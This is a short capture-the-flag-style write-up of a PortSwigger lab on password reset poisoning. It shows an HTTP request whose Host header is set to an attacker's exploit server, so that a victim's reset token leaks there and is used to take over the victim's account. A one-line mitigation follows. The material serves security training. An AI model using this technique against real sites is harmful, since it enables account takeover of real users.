# Lab 01 — Basic password reset poisoning

> **Apprentice** · [Official lab](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

**Entry point:** `POST /forgot-password` — the reset link is built from the
unvalidated `Host` header.

## Solution

1. Request a reset for your own account; note the emailed link contains
   `temp-forgot-password-token`.
2. In Repeater: change `Host` to your exploit server and `username` to
   `carlos`:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
...
username=carlos
```

3. The exploit server access log captures
   `GET /forgot-password?temp-forgot-password-token=VICTIM-TOKEN`.
4. Open your own genuine reset URL, swap in carlos's token, set a new
   password, log in as carlos — lab solved.

## Mitigation

Build reset links from server config; never from the Host header.
